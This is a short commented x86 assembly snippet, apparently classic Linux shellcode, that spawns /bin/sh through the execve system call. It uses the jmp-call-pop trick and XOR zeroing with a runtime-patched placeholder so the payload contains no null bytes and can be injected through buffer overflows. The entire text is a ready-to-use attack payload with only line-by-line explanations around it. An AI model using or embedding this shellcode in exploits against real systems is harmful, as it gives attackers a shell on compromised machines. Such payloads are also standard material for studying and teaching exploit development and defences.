JMP _WANT_BIN_BASH
_GOT_BIN_BASH:
MOV EDX, 0x11111111      # We don't want EDX to have zeroes.
XOR EDX,EDX              # EDX = 0.
MOV EAX, EDX             # EAX = EDX = 0.
MOV AL, 0x0B             # 11 - code for execute.
POP EBX                  # EBX = "/bin/sh@".
MOV BYTE PTR [EBX+7], DL # Changing @ to 0.
MOV ECX, EDX             # argv is 0.
INT 0x80                 # System call.

_WANT_BIN_BASH:
CALL _GOT_BIN_BASH       # Call trick
.ASCII "/bin/sh@"        # Avoiding usage of zero


